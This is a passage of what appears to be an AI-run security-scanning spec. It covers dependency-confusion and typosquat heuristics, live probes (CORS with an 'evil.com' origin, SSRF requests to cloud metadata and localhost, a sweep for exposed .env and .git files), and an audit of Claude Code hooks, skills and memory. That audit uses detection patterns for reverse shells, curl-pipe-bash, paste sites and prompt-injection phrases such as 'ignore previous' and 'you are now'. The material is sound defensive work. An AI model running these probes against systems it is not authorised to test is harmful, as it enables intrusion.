  - Whether a scoped name is actually private, already publicly owned, or claimable is a registry-ownership fact the unattended prompt can't verify — absence of an `.npmrc` pin alone false-positives on legitimate public scopes, and the guard list below is only a sample. Emit to the **Watch List (confidence < 0.8)** only, never an Active Flag, until the candidate-generation script does the real registry/ownership lookup (same lane as `typosquat-dependency`).
  - Candidate signal: a scoped or internal-looking package in `package.json` (`@<org>/...`, or unscoped names that read internal like `acme-internal-utils`, `<company>-billing-sdk`) with NO private-registry pin covering that scope in `.npmrc`/`.yarnrc` (`@<org>:registry=https://...` or a project-wide private `registry=`) — it would resolve from the public registry, where a higher-versioned malicious package of the same name can win resolution (Birsan substitution).
  - Guard (do NOT watch-list): the scope is pinned to a private registry; the package is a known PUBLIC scoped package (`@types/*`, `@supabase/*`, `@radix-ui/*`, `@vercel/*`, `@tanstack/*`, etc.); a monorepo workspace package resolved locally (`workspace:`/`file:` protocol).
  - Text (Watch List): "`{package}` is a scoped/internal dependency with no private-registry pin in `.npmrc` — IF it is a private name, public-registry substitution (dependency confusion) is possible. Verify ownership; pin the scope or defensively register the name."

- **Typosquat dependency** (`typosquat-dependency`, moderate, A08) — **PROVISIONAL (Watch List only)**:
  - Pure-prompt name-similarity is unreliable — real detection needs Levenshtein distance plus registry age/download-count lookups the scan can't do inline. Emit to the **Watch List (confidence < 0.8)** only, never an Active Flag, until the candidate-generation script lands (same lane as the v7.1 provisionals).
  - Candidate signal: a dependency name within edit-distance 1–2 of a high-popularity package (`expresss`→`express`, `crossenv`→`cross-env`, `lodahs`→`lodash`, `momnet`→`moment`), or separator/scope manipulation of one (`react-dom-router`, `@types-node`).
  - Guard (do NOT watch-list): exact matches to real packages; well-known packages whose names merely resemble each other (`react` vs `preact`); first-party/internal names that are intentional.
  - Text (Watch List): "`{package}` is within edit-distance {n} of popular package `{target}` — possible typosquat. Verify it's the intended package (check author, age, download count) before trusting it."

Also extract the deployed URL:
- Check vercel.json for "alias" or "domains" fields
- Check package.json for "homepage" field
- Check for CNAME file in root or public/
- Prefer custom domains over *.vercel.app URLs
- Return the production URL if found, otherwise null

---

## STEP 1B: DEPLOYED SURFACE SCAN (optional — skip if no URL found)

If a production URL was extracted in Step 1, run these checks against the live site using `curl`. If no URL was found, skip this step and set `deployedSurface` to `null` in the JSON output.

**URL EXTRACTION FALLBACK (v7.5, BLOCKING).** Before concluding "no URL found", exhaust these
candidate sources in order and PROBE any candidate you find — do not skip STEP 1B merely because the
three canonical config sources are empty:

1. `vercel.json` `alias`/`domains`, a `CNAME` file, `package.json` `homepage` — the canonical three.
2. **`metadataBase` / `sitemap` / `robots` targets** in `app/layout.*`, `next-sitemap.config.*`, or a
   generated `sitemap.*` — a Next.js app almost always names its own canonical origin here.
3. **`.vercel/repo.json` / `.vercel/project.json`** project name → `https://<project>.vercel.app`.
4. A URL recorded in the project's own `CLAUDE.md` / `SESSION-HANDOFF.md` from a prior scan.

Probe each candidate with `curl -sI`. Treat a **2xx/3xx response whose body or headers identify this
app** as a confirmed deployment, run the full STEP 1B against it, and record where the URL came from
in `deployedSurface.url` provenance. Only after every candidate 404s/NXDOMAINs may you set
`deployedSurface: null`.

**Why:** on the 2026-07-30 cycle two live public sites — `precisionfarms-website` and `pew-planner`
— were recorded by prior scans as `_Not deployed_` with STEP 1B skipped entirely, because the three
canonical sources were empty. Both answered HTTP 200 when probed via `metadataBase` and
`.vercel/repo.json` respectively. This is the same defeat-by-input-selection class as the v7.3
`.nvmrc`-vs-`engines` bug: a check that silently does not run reports as a clean check, and
"not deployed" is asserted about a live public surface.

### HTTP Security Headers (verify deployed state)
Run `curl -sI <URL>` and check the response headers for:
- Content-Security-Policy
- Strict-Transport-Security (HSTS)
- X-Content-Type-Options
- X-Frame-Options
- Referrer-Policy
- Permissions-Policy
- Access-Control-Allow-Origin — flag if wildcard `*` on authenticated routes
- Server header — flag if it reveals platform version details

Compare deployed headers against source code configuration (next.config.js, vercel.json, middleware.ts). Flag mismatches where headers are configured in code but not served in production.

> **GATE (I13, BLOCKING, v7.6).** This comparison reads LOCAL files. Run the freshness check in I13
> first. If the clone is behind origin, unknown, or dirty in any of those config files, **do not emit
> `deployed-header-mismatch` or any other source-vs-deployed finding** — emit `repo-sync-skipped-dirty`
> and record which comparisons were suppressed. A clone 17 commits stale produced a P2 for a CSP that
> had been fixed a month earlier, and it was carried as live for two cycles. Findings drawn from the
> live response alone are unaffected.

### Auth Provider Configuration
Check the page HTML source (via `curl -s <URL>`) for auth provider scripts:

**Clerk** — look for `data-clerk-publishable-key` attribute on a script tag:
- Decode the publishable key: strip `pk_live_` or `pk_test_` prefix, base64-decode the remainder to get the Clerk frontend API domain
- Query `https://<clerk-domain>/v1/environment?__clerk_api_version=2025-11-10`
- From the response, check:
  - `user_settings.password_settings.min_length` — flag if < 12
  - `user_settings.password_settings.disable_hibp` — flag if true (breached passwords allowed)
  - `user_settings.password_settings.require_special_char`, `require_numbers`, `require_uppercase`, `require_lowercase` — flag if all false (no complexity)
  - `user_settings.sign_up.captcha_enabled` — flag if false
  - `user_settings.attack_protection.user_lockout.max_attempts` — flag if > 20
  - `user_settings.attack_protection.user_lockout.duration_in_minutes` — flag if < 15
  - `user_settings.attack_protection.enumeration_protection.enabled` — flag if false
  - `user_settings.sign_in.second_factor.required` — note if MFA is optional
  - `user_settings.attributes.authenticator_app.enabled` — note if TOTP is disabled
  - `user_settings.attributes.backup_code.enabled` — note if backup codes are disabled

**Supabase** — look for `NEXT_PUBLIC_SUPABASE_URL` or supabase client initialization:
- Check if `<supabase-url>/auth/v1/settings` is publicly accessible and returns auth configuration

**Firebase** — look for `firebaseConfig` object in page source:
- Note any exposed project ID, API key, auth domain

### Information Leakage Endpoints
- `curl -s <URL>/api/health` (and `/api/status`, `/api/ping`, `/healthz`, `/health`) — flag if response includes database type, connection status, latency, version numbers, or internal service names
- Check page HTML source for Sentry DSN patterns: `sentry_key`, `ingest.sentry.io`, `@o[0-9]+.ingest` — the DSN itself is semi-public but can be abused for event flooding
- Check for `/.well-known/security.txt` — note if missing (P4)
- Check if `/_next/static/<buildId>/_buildManifest.js` is accessible — note the route count from the bloom filter if exposed

### CORS Verification
- `curl -sI -H "Origin: https://evil.com" <URL>/api/health` — check if `Access-Control-Allow-Origin: *` is returned on API routes, not just static assets

### DNS & Email Authentication (v6.5 addition)
Extract the apex domain from the deployed URL (e.g., `example.com` from `https://example.com`, `example.org` from `https://app.example.org`). Run:

```bash
DOMAIN="<apex-domain>"
dig +short TXT "_dmarc.${DOMAIN}"     # DMARC record
dig +short TXT "${DOMAIN}"             # SPF lives in apex TXT records
dig +short TXT "default._domainkey.${DOMAIN}"  # Most-common DKIM selector (may need others)
dig +short CAA "${DOMAIN}"             # CAA records
```

Parse the results:
- **DMARC**: if no record → flag `missing-dmarc` severity moderate. If record exists but contains `p=none` → flag `dmarc-policy-none` severity moderate ("monitor-only, no enforcement"). If `p=quarantine` or `p=reject` → no flag (acceptable).
- **SPF**: if no `v=spf1` in apex TXT → flag `missing-spf` severity moderate. Note: SPF alone isn't enough; flag separately even if DKIM is set.
- **DKIM**: if no `default._domainkey` AND no other selector found (try `google._domainkey`, `selector1._domainkey`, `mandrill._domainkey`, `resend._domainkey`) → flag `missing-dkim` severity moderate. Note: this check is best-effort; absence of `default._domainkey` doesn't prove DKIM isn't configured under a different selector. If Resend or another known sender is in envSecrets, look for that provider's standard selector.
- **CAA**: if no CAA record → flag `missing-caa` severity maintenance ("any CA can issue certs for this domain"). Fix: add CAA records pinning to your actual issuer (e.g., `0 issue "letsencrypt.org"`).

For projects without a custom domain (only `*.vercel.app` or `*.netlify.app`): skip the DNS audit and note `dnsAudit: "skipped — no custom domain"` in `deployedSurface`.

### Unauthenticated Cron / Webhook Endpoint Audit (v6.5 addition)
For each project, enumerate cron and webhook routes from these sources:
- `vercel.json` `crons[]` array (Vercel's scheduled function format)
- Files matching `**/api/cron/**`, `**/api/webhook*/**`, `**/api/webhooks/**`
- Edge function paths defined in `supabase/functions/*/index.ts`

For each cron route found:
- Read the handler file
- Check for an auth gate. Acceptable patterns: `Bearer ${process.env.CRON_SECRET}` header validation, Vercel's `x-vercel-cron` header check, Supabase service-role JWT validation
- If no auth check on the first ~30 lines of the handler → flag `unauthenticated-cron` severity critical. Text: "Cron route {path} has no auth check — anyone hitting the URL triggers the job. Database writes, email sends, or expensive compute at attacker's pace."
- Fix: add `if (req.headers.authorization !== \`Bearer ${process.env.CRON_SECRET}\`) return new Response('Unauthorized', { status: 401 })` at the top of the handler.

For each webhook route found:
- Check for a signature verification call appropriate to the provider:
  - Stripe: `stripe.webhooks.constructEvent` (already covered in STEP 1; double-flag if both checks fire)
  - GitHub: HMAC-SHA256 of body against `x-hub-signature-256` header
  - Resend: webhook signing secret check
  - Custom: any HMAC or shared-secret verification BEFORE the body is parsed
- If no signature verification → flag `unauthenticated-webhook` severity critical. Text: "Webhook handler {path} doesn't verify the request signature — attacker can replay or forge events from {provider}."
- Fix: verify the provider's signature header against the shared secret using a constant-time comparison (`crypto.timingSafeEqual`).

### CORS Origin Reflection + Credentials Probe (v6.6 addition)
The v6.4 CORS Verification probe only checks for wildcard `Access-Control-Allow-Origin: *`. The more dangerous and more common misconfiguration is **reflecting an arbitrary `Origin` while also sending `Access-Control-Allow-Credentials: true`**. That combination lets an attacker site read authenticated API responses from the victim's browser.

Run two probes:

```bash
# Simple GET — does the server reflect arbitrary origin AND set credentials?
curl -si -H "Origin: https://evil-test.example" <URL>/api/<known-auth-endpoint> | head -30

# Preflight — same question for cross-origin POST
curl -si -X OPTIONS \
  -H "Origin: https://evil-test.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  <URL>/api/<known-auth-endpoint> | head -30
```

Parse the response headers:
- `Access-Control-Allow-Origin: https://evil-test.example` (or any reflection of the request `Origin`) AND `Access-Control-Allow-Credentials: true` → flag `cors-origin-reflection` severity critical. Text: "API at {endpoint} reflects arbitrary request `Origin` header AND sends `Access-Control-Allow-Credentials: true`. Any attacker website can read authenticated API responses from a logged-in user's browser via fetch with credentials."
- Fix: maintain an allowlist of permitted origins; only set `Access-Control-Allow-Origin` to the request's `Origin` IF it's on the allowlist. Never combine `*` with `credentials: true` (browsers reject this, but a reflected specific origin + credentials is the dangerous valid combo).
- Endpoint selection: prefer authenticated routes (e.g., a route requiring a Supabase JWT). For projects without an obvious endpoint, probe `/api/me`, `/api/user`, `/api/account`, or any cron/admin route discovered in STEP 1.

### SSRF Live Probe Against Proxy-Shaped Routes (v6.6 addition)
For routes discovered in the v6.6 STEP 1 SSRF code grep (any `/api/proxy*`, `/api/fetch*`, `/api/import*`, `/api/preview*`, `/api/scrape*`, `/api/url*`), live-probe against the deployed URL:

```bash
# Cloud metadata endpoint (AWS / GCP)
curl -s --max-time 5 "<URL>/api/proxy?url=http://169.254.169.254/latest/meta-data/" | head -5
curl -s --max-time 5 "<URL>/api/proxy?url=http://metadata.google.internal/computeMetadata/v1/" | head -5

# Localhost services
curl -s --max-time 5 "<URL>/api/proxy?url=http://127.0.0.1:80" | head -5
curl -s --max-time 5 "<URL>/api/proxy?url=http://localhost:5432" | head -5

# RFC1918 internal ranges
curl -s --max-time 5 "<URL>/api/proxy?url=http://10.0.0.1" | head -5
```

If any probe returns a non-error response body (HTTP 200 with content, or HTTP 5xx with internal error details) → flag `ssrf-user-url-fetch` severity critical with the deployed-proxy-route confirmation appended to the text.

If all probes return 4xx or empty (`fetch failed`, allowlist rejection) → no live flag. The code grep flag from STEP 1 may still fire if no allowlist is present in source.

Probe budget: max 5 distinct routes per project to avoid hammering the deployed service. Use `--max-time 5` on every curl so a stuck probe doesn't hang the scan.

### Exposed Sensitive Endpoint Curl Sweep (v6.6 addition)
Cheap, high-value: sweep the deployed URL for accidentally-public framework files, debug endpoints, and source-control leakage. Most catastrophic config misses surface here.

```bash
# Run this list against <URL>. Capture HTTP status + first 100 bytes of body for each.
for path in \
  "/.env" "/.env.local" "/.env.production" "/.env.development" \
  "/.git/HEAD" "/.git/config" "/.gitignore" \
  "/config.json" "/config.yml" "/secrets.json" \
  "/debug" "/__debug__" "/actuator" "/actuator/health" "/actuator/env" \
  "/server-status" "/server-info" "/phpinfo.php" "/info.php" \
  "/backup.sql" "/dump.sql" "/db.sqlite" "/database.sqlite" \
  "/wp-config.php" "/wp-admin/" \
  "/_next/static/chunks/_buildManifest.js" \
  "/swagger" "/swagger-ui" "/openapi.json" "/api-docs" \
  "/.DS_Store" "/Thumbs.db" \
  "/composer.json" "/composer.lock"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "<URL>${path}")
  if [ "$code" = "200" ] || [ "$code" = "206" ]; then
    body=$(curl -s --max-time 5 "<URL>${path}" | head -c 200)
    echo "HIT ${code} ${path}: ${body}"
  fi
done
```

For each HIT with HTTP 200/206 and non-trivial body:
- Flag `public-sensitive-endpoint` severity critical. Text: "{path} returns HTTP 200 on the deployed site. Body preview: `{first 100 chars}`. This file/endpoint should not be publicly accessible — likely indicates accidental deployment of source files, debug tooling, or backup artifacts."
- Fix depends on what's exposed:
  - `.env*`: rotate every secret in the file immediately, then remove from build output / public directory; check `.gitignore` and `.vercelignore`
  - `.git/*`: configure Vercel/host to deny `.git/` paths; this can leak the entire commit history
  - Framework debug endpoints (`/actuator`, `/debug`, `/server-status`): disable in production config
  - `_buildManifest.js`: typically safe but verify it doesn't expose private routes
  - Backup files (`backup.sql`, `dump.sql`): never commit; never serve

Filter out known-OK paths the user has accepted (manually mark `status: "accepted"` in the dashboard).

---

### Credential & Endpoint Afterlife (v7.6 addition)

**This scan is repo-scoped. Access that outlives the code that needed it does not live in a repo.**
On the app that produced this section, four separate credentials or endpoints were still live long
after their purpose ended, and the repo-scoped scan could not see any of them. Both checks below are
cheap and mechanical.

**A. Orphaned platform credentials.** Compare env var *names* on the deploy platform against names
referenced anywhere in source. Never print values.

```bash
# Scope to ONE environment — preview/dev-only vars are not orphans in production.
vercel env ls production 2>/dev/null | awk 'NR>2 {print $1}' \
  | grep -E '^[A-Z_][A-Z0-9_]*$' \
  | grep -vE '^(VERCEL|NX|TURBO|NEXT_RUNTIME)_|^(CI|NODE_ENV|PORT)$' \
  | sort -u > /tmp/wt_platform_env

# Referenced anywhere in FIRST-PARTY source. Excluding build output and deps is required:
# a compiled bundle or a dependency mentioning the same name makes an orphan look "used".
grep -rhoE "(process\.env|import\.meta\.env)(\.[A-Z_][A-Z0-9_]*|\[[\"'][A-Z_][A-Z0-9_]*[\"']\])" \
  --include="*.js" --include="*.jsx" --include="*.ts" --include="*.tsx" --include="*.mjs" \
  --exclude-dir=node_modules --exclude-dir=.next --exclude-dir=dist --exclude-dir=build \
  --exclude-dir=.vercel --exclude-dir=coverage --exclude-dir=.git . 2>/dev/null \
  | grep -oE "[A-Z_][A-Z0-9_]{2,}" \
  | sort -u > /tmp/wt_src_env
# NOTE: extract with a plain uppercase-token match. `grep -E` is POSIX ERE and does NOT
# support lookahead — a `(?=...)` form here silently matches nothing, which would drop every
# bracket-style reference and make a referenced var look orphaned. Verified against
# process.env.X, process.env["X"], and import.meta.env['X'].
# Also check non-JS references (CI config, Dockerfile, docs) before concluding "unused":
grep -rhoE "\b[A-Z_][A-Z0-9_]{3,}\b" .github/ *.yml *.yaml Dockerfile* 2>/dev/null | sort -u >> /tmp/wt_src_env
sort -u -o /tmp/wt_src_env /tmp/wt_src_env

comm -23 /tmp/wt_platform_env /tmp/wt_src_env    # on the platform, referenced NOWHERE
```

**A name is not a credential.** This sees names only, so severity is by NAME SHAPE, and the flag text
must say the value was never inspected:

| Unreferenced name matches | Category | Severity |
|---|---|---|
| `*_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD`, `*_CREDENTIAL`, `*_DSN`, `*_PRIVATE*` | `orphaned-platform-credential` | **P2** |
| anything else (feature flags, public IDs, URLs, tuning values) | `orphaned-platform-credential` | **P4** — dead config, note and move on |

Validated against a repo with a known answer: 8 platform names vs 121 source-referenced names yielded
exactly one orphan, `RAPIDAPI_KEY` — a live key unused for ~131 days — with no false positives.

Flag text must say **delete from the platform AND rotate at the issuer** — an unused key is still a
valid key. If the platform CLI is unavailable or unauthenticated, report `unknown`, never `clean` (I8).

**B. Retired-backend endpoints that were never revoked.** When an app migrates off a backend, the old
endpoint usually keeps serving. Detect the fingerprint in **git history**, not just the working tree:

```bash
git log --all -S"script.google.com/macros" --oneline 2>/dev/null | head -5
git log --all -S"execute-api" --oneline 2>/dev/null | head -5      # API Gateway
git log --all -S"cloudfunctions.net" --oneline 2>/dev/null | head -5
git grep -I -l -E "script\.google\.com/macros|/exec\?|cloudfunctions\.net|execute-api" $(git rev-list --all 2>/dev/null | head -50) 2>/dev/null | head -5
```

A history hit alone proves only that the string **once existed** — never that anything is still
deployed. Do not name or score it as live on that basis (I1). **Recover the URL and probe it**, which
turns an inference into a measurement:

```bash
# Recover candidate URLs from history (values, not just commits)
git log --all -p -S"script.google.com/macros" 2>/dev/null \
  | grep -ohE "https://script\.google\.com/macros/s/[A-Za-z0-9_-]+/(exec|dev)" | sort -u
# Probe each. Do NOT send credentials, and use a read-only path/param if one exists.
curl -s -o /dev/null -w "%{http_code}\n" --max-time 20 "<recovered-url>"
```

| Probe result | Category | Severity |
|---|---|---|
| **200 / 401 / 403** — something is still deployed and answering | `retired-backend-endpoint-live` | **P1** (200 unauthenticated) / **P2** (401/403 — deployed but gated) |
| **404 / 410 / NXDOMAIN** — revoked | none | resolved; note it in the scan body |
| **No URL recoverable, or probe not possible** | `retired-backend-endpoint-unverified` | **P3 handoff** — name the endpoint shape and ask the owner to check the provider console |

Never emit `*-live` without a probe result. A repo that removed **and** revoked an old endpoint is the
healthy case and must score clean — flagging it P1 on history alone would be exactly the
inferred-state defect I1 exists to prevent.

> **Do NOT suppress on "still referenced in current source" — that check was tried and failed.**
> On the repo that produced this rule, the Apps Script URL was still referenced by
> `scripts/migrate-to-firebase.mjs`, a completed one-shot migration for a backend that no longer
> exists. A surviving reference from a migration script, a legacy import tool, or a commented-out
> block says nothing about whether the endpoint is still *deployed* — and that endpoint was live,
> public, and accepting writes. Suppressing on it would have produced a false negative on the exact
> case this rule exists for. List current references as **context for the owner**, never as a reason
> to stay silent.

The cost here is deliberately asymmetric: a spurious handoff costs one console check, while a missed
one leaves an unauthenticated write endpoint on live data.

Why P1 by default: the instance behind this rule was a Google Apps Script web app, still deployed
`Execute as: <owner>` / `Who has access: Anyone`, exposing **unauthenticated read and write/delete**
over a live spreadsheet to anyone holding the URL. A sibling app's equivalent held customer names,
phones and emails, and a `doGet` routed into the same write handler — so a plain GET could mutate
records.

> **Do not claim coverage you do not have.** This scan cannot query Google Workspace, AWS, or GCP
> consoles. It detects the *fingerprint* and hands off. Reporting "no Apps Script exposure found"
> would be worse than reporting nothing, because it converts a blind spot into a false all-clear (I8).

## STEP 1C: AI TOOL SUPPLY CHAIN (global — runs ONCE per scan cycle)

This step audits the Claude Code environment itself: installed skills, plugins, MCP servers, hooks, memory files, and the Claude Code version. It runs **once per scan cycle**, not per project. Global findings are written to `data/ai-tool-intel.js` in the Watchtower runtime repo (the directory pointed at by `watchtowerRoot` in `watchtower.config.json`). Project-specific findings (e.g., a malicious skill in a project's `.claude/skills/`, or an MCP server in a project's `.claude/settings.local.json`) are appended to that project's `flags` array using `ai-` prefixed categories.

In SINGLE PROJECT MODE, run only the per-project parts of this step (Phase 2 project MCPs, Phase 3 project skills, Phase 4 project hooks, Phase 6 project settings) and skip the global write.

### Phase 1: Fetch threat database + Safe List

Fetch the latest threat intelligence from the `claude-code-ultimate-guide` repo (community-maintained, ~30+ source advisories):

```bash
# Cache for the scan run — fetch once, reuse across phases
curl -s https://raw.githubusercontent.com/FlorianBruniaux/claude-code-ultimate-guide/main/examples/commands/resources/threat-db.yaml > /tmp/threat-db.yaml
curl -s https://raw.githubusercontent.com/FlorianBruniaux/claude-code-ultimate-guide/main/guide/security/security-hardening.md > /tmp/security-hardening.md
```

Parse `/tmp/threat-db.yaml` and extract:
- `version`, `updated` (date string)
- `malicious_authors` (list of author strings)
- `malicious_skills` (list of `{name, author, source, ...}` entries)
- `malicious_skill_patterns` (regex patterns for skill names)
- `cve_database` (list of `{id, component, severity, fixed_in, ...}`)
- `minimum_safe_versions` (map of `package → min-version`)
- `suspicious_patterns.{hooks, agents, config, secrets, injection, skill_content}`
- `campaigns` (top-level threat campaigns with stats)
- `attack_techniques` (T001-T0NN with mitigations)

**Staleness check (CRITICAL):**
- Compute days between `updated` and today
- If > 30 days → emit a global flag with category `ai-threat-db-stale`, severity `P3`, text `"Threat DB last updated YYYY-MM-DD (N days ago) — community-maintained source may be falling behind."`, fix `"Verify the source repo is still active. Manually cross-check critical findings against NVD or vendor advisories."`
- If > 90 days → upgrade to severity `P2`
- Always record the `updated` date and `daysOld` in the global output regardless

Extract the MCP **Safe List** from `/tmp/security-hardening.md` (search for the heading `MCP Safe List`). It looks like:

```
| `@anthropic/mcp-server-*` | Safe |
| `context7` | Safe |
| `sequential-thinking` | Safe |
| `memory` | Safe |
| `filesystem` (unrestricted) | Risk |
| `database` (prod credentials) | Unsafe |
| `browser` (full access) | Risk |
```

Treat anything marked `Safe` as vetted; `Risk`/`Unsafe` warrant flags; anything not in the list is "unvetted" (P3 manual review, not auto-malicious).

### Phase 2: MCP server audit

Read all MCP configurations:

```bash
# Global Claude Code MCP config
cat ~/.claude.json 2>/dev/null
cat ~/.claude/settings.json 2>/dev/null
cat ~/.claude/settings.local.json 2>/dev/null

# Project MCP configs (in BATCH MODE, each per-project agent does this for its directory)
cat .mcp.json 2>/dev/null
cat .claude/settings.json 2>/dev/null
cat .claude/settings.local.json 2>/dev/null
```

For each MCP server entry (including the package name extracted from `args` like `["-y", "@scope/pkg@1.2.3"]`):

- **CVE check** — match the package name against `cve_database[].component` and `minimum_safe_versions`. If pinned version < `fixed_in` or < `minimum_safe_versions[pkg]` → flag.
  - Severity: P1 if CVE severity is `critical`, P2 if `high`, P3 if `medium` or below.
  - category: `ai-mcp-cve`
  - text: `"MCP server {pkg}@{version} matches {CVE-id} ({cve.description}). Fixed in {fixed_in}."`
  - fix: `"Pin to >= {fixed_in} or remove this MCP server."`
  - exploit: copy from `cve.description` or `cve.notes`
- **Version pinning** — if the version is `@latest`, missing, or `*` → flag.
  - Severity: P3
  - category: `ai-mcp-unpinned`
  - text: `"MCP server {pkg} is unpinned (uses @latest or no version). Supply-chain rug-pull risk."`
  - fix: `"Pin to an exact version like @1.2.3."`
- **Dangerous flags** — if any arg contains `--dangerous`, `--unsafe`, `--no-verify`, `dangerouslySkipPermissions` → flag.
  - Severity: P1
  - category: `ai-config-dangerous`
- **Safe List check** — if the package name is not on the Safe List and not on the Risk/Unsafe list → flag (advisory only, single flag per scan, listing all unvetted MCPs).
  - Severity: P3
  - category: `ai-mcp-not-vetted`
  - confidence: 0.7 (advisory)
  - fix: `"Manually review each unvetted MCP. The Safe List is small and curated; absence is not malicious, just unverified."`
- If on the Risk/Unsafe sub-list (e.g., `filesystem` unrestricted, `database` with prod credentials) → P2 flag with category `ai-mcp-not-vetted` and the specific risk note.

### Phase 3: Skills, plugins, agents audit

```bash
# Global
ls -la ~/.claude/skills/ 2>/dev/null
ls -la ~/.claude/plugins/ 2>/dev/null
ls -la ~/.claude/agents/ 2>/dev/null

# Project (per-agent in BATCH MODE)
ls -la .claude/skills/ 2>/dev/null
ls -la .claude/plugins/ 2>/dev/null
ls -la .claude/agents/ 2>/dev/null
```

For each skill/plugin/agent directory found:
- Read its `SKILL.md`, `plugin.json`, or agent frontmatter
- Extract `name`, `author` (or `owner` from path/manifest)

**Checks:**
- **Malicious author match** — author string in `malicious_authors` → P1 flag
  - category: `ai-skill-malicious`
  - text: `"Skill '{name}' authored by '{author}' — listed in {threat-db source} malicious authors."`
- **Malicious skill match** — name + author tuple matches an entry in `malicious_skills` → P1 flag
  - category: `ai-skill-malicious`
- **Pattern match** — name matches a regex in `malicious_skill_patterns` → P2 flag (probable, not certain)
  - category: `ai-skill-malicious`
  - confidence: 0.8
- **Skill content scan** — grep each `SKILL.md` for patterns from `suspicious_patterns.skill_content`:
  - `curl ... | bash`, `base64 -d ... | bash`, `chmod +x ... && ./`, `password.*openclaw`, `webhook.site`, `requestbin.com`, `/bin/bash -i >/dev/tcp` → P1 flag
  - category: `ai-skill-malicious`
- **Agent tool breadth** — if an agent's frontmatter has `allowed-tools: ["Bash"]` only, or wildcard tool access without justification → P3 flag
  - category: `ai-config-dangerous`

### Phase 4: Hook security

```bash
# All hooks (global + per-project)
find ~/.claude/hooks/ -type f \( -name "*.sh" -o -name "*.ps1" -o -name "*.js" -o -name "*.py" \) 2>/dev/null
find .claude/hooks/ -type f \( -name "*.sh" -o -name "*.ps1" -o -name "*.js" -o -name "*.py" \) 2>/dev/null
```

For each hook file, scan for patterns from `suspicious_patterns.hooks`:
- `curl|wget` → P2 (`ai-hook-suspicious`, "network call in hook")
- `nc |ncat|netcat|/dev/tcp|/dev/udp` → P1 (`ai-hook-suspicious`, "reverse shell indicator")
- `eval|exec` → P2 (`ai-hook-suspicious`, "dynamic code execution")
- `base64` → P3 (`ai-hook-suspicious`, "obfuscation possible — verify what's encoded")
- `ssh|id_rsa|id_ed25519` → P1 (`ai-hook-suspicious`, "SSH key access in hook")
- `\.env|credentials|secret|password|token|api.key` → P1 (`ai-hook-suspicious`, "credential access in hook")
- `glot.io|pastebin.com|hastebin.com` → P2 (`ai-hook-suspicious`, "paste site reference — ClawHavoc indicator")

For each hit, include the hook path and the matched line in the flag text.

**False-positive note:** your own gstack hooks may legitimately use curl, eval, and env access. Each hit is a flag for review, not auto-removal. Include the hook owner/source if detectable (e.g., from filename or directory).

### Phase 5: Memory poisoning check

Scan memory and config files for prompt-injection / role-hijacking patterns:

```bash
grep -in "ignore previous\|disregard\|forget\|override\|you are now\|new instructions\|developer mode\|DAN\|jailbreak" \
  ~/.claude/CLAUDE.md ~/.claude/MEMORY.md ~/.claude/SOUL.md \
  ~/.claude/projects/*/memory/*.md \
  CLAUDE.md .claude/CLAUDE.md MEMORY.md AGENTS.md 2>/dev/null
```

Check for invisible Unicode (zero-width chars, RTL overrides, tag chars from `suspicious_patterns.injection`):

```bash
# Hex dump short check — any zero-width or RTL chars in memory files
python3 -c "
import re, sys
patterns = [r'[​-‍﻿]', r'[‪-‮⁦-⁩]', r'[\U000E0000-\U000E007F]']
for f in ['CLAUDE.md', '.claude/CLAUDE.md', 'MEMORY.md']:
    try:
        with open(f) as fh: content = fh.read()
        for p in patterns:
            if re.search(p, content): print(f'{f}: invisible Unicode match for {p!r}')
    except: pass
" 2>/dev/null
```

Findings:
- Direct prompt-injection language in CLAUDE.md/MEMORY.md → P2 `ai-memory-poisoning`
- Instructions to disable security checks, skip reviews, or grant broad permissions → P1 `ai-memory-poisoning`
- Invisible Unicode in memory files → P1 `ai-memory-poisoning`
- HTML comments containing `ignore|forget|override|system|admin|instruction` → P2 `ai-memory-poisoning`

### Phase 6: Permissions and settings

```bash
cat ~/.claude/settings.json 2>/dev/null
cat ~/.claude/settings.local.json 2>/dev/null
cat .claude/settings.json 2>/dev/null
cat .claude/settings.local.json 2>/dev/null
```

Check for patterns from `suspicious_patterns.config`:
- `dangerouslySkipPermissions` set to true anywhere → P1 `ai-config-dangerous`
- Wildcard `Bash(*)` in `permissions.allow` → P2 `ai-config-dangerous`
- Wildcard `Write(*)` in `permissions.allow` → P2 `ai-config-dangerous`
- Missing `permissions.deny` covering `.env*`, `*.pem`, `*.key`, `id_rsa*`, `*.credentials` → P3 `ai-config-dangerous` (advisory)

### Phase 7: Exposed secrets in `.claude/`

```bash
# Scan all .claude/ files for secret patterns from suspicious_patterns.secrets
grep -rn -E "sk-[a-zA-Z0-9]{20,}|sk-ant-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36}|AKIA[A-Z0-9]{16}|xox[bps]-[a-zA-Z0-9-]{20,}" \
  ~/.claude/ 2>/dev/null
grep -rn -E "sk-[a-zA-Z0-9]{20,}|sk-ant-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36}|AKIA[A-Z0-9]{16}|xox[bps]-[a-zA-Z0-9-]{20,}" \
  .claude/ 2>/dev/null

# Private keys
grep -rln "BEGIN.*PRIVATE KEY" ~/.claude/ .claude/ 2>/dev/null
```

**PREFIXLESS CREDENTIALS (v7.6, BLOCKING).** The patterns above are all vendor-prefix shaped, and a
real P1 walked straight through them: a **36-character UUID bearer token hardcoded inside a permission
allow-rule** in `settings.local.json`, pre-approving a `curl` against a production endpoint. It matched
none of `sk-` / `ghp_` / `AKIA` / `xox` / `BEGIN PRIVATE KEY`, and was found only because an agent read
the settings file directly. A secret with no vendor prefix is still a secret. Run these too:

```bash
# Auth headers and credential-bearing URLs inside settings/permission rules
grep -rn -E "Authorization:[[:space:]]*(Bearer|Basic)[[:space:]]+[A-Za-z0-9._~+/=-]{16,}" \
  ~/.claude/settings*.json ~/.claude/*.json .claude/settings*.json 2>/dev/null
grep -rn -E "[?&](api_?key|apikey|token|secret|access_token|auth)=[A-Za-z0-9._~+/=-]{16,}" \
  ~/.claude/settings*.json .claude/settings*.json 2>/dev/null
# UUID-shaped and long high-entropy literals inside allow/deny rules
grep -rn -E "\"(Bash|WebFetch)\([^\"]*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" \
  ~/.claude/settings*.json .claude/settings*.json 2>/dev/null
```

Each hit → P1 flag, category `ai-config-dangerous`, text includes the file path and the secret pattern type (never include the secret value itself).

